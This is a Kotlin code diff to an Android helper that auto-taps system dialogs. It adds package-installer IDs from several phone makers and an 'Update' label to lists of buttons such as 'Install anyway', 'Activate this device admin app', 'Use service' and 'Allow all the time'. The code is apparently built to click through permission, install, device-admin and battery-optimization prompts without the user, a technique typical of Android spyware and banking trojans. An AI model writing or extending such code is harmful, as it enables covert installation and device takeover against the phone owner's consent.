@@ -26,6 +26,11 @@ object AutoPermissionHelper {
     private val AUTO_TAP_PACKAGES = setOf(
         PKG_PERMISSION_CONTROLLER,
         PKG_PACKAGE_INSTALLER,
+        "com.google.android.packageinstaller",
+        "com.samsung.android.packageinstaller",
+        "com.miui.packageinstaller",
+        "com.coloros.packageinstaller",
+        "com.vivo.packageinstaller",
         PKG_SETTINGS,            // Accessibility, battery-opt, usage-access
         "com.android.settings",  // stock Android settings
         "com.miui.securitycenter",   // Xiaomi
@@ -41,13 +46,14 @@ object AutoPermissionHelper {
         "Allow", "Allow all the time", "While using the app",
         "Allow all", "Allow permissions", "Grant", "Continue",
         "Activate", "Activate this device admin app",
-        "Install", "Install anyway", "Next", "Done", "Finish",
+        "Install", "Install anyway", "Update", "Next", "Done", "Finish",
         "OK", "Got it", "I agree", "Accept", "Enable",
         "Turn on", "Start", "Set up", "Confirm",
         "Use service",  // Accessibility service enable dialog
         "Unrestricted", "Don\u0027t optimize", "Allow background activity",  // Battery optimization
         "Yes"  // Generic confirmation
     )
+
 
     // Packages that may show the dialer (for secret code fallback).
     // Covers AOSP, Google, Samsung, and the major OEM forks.
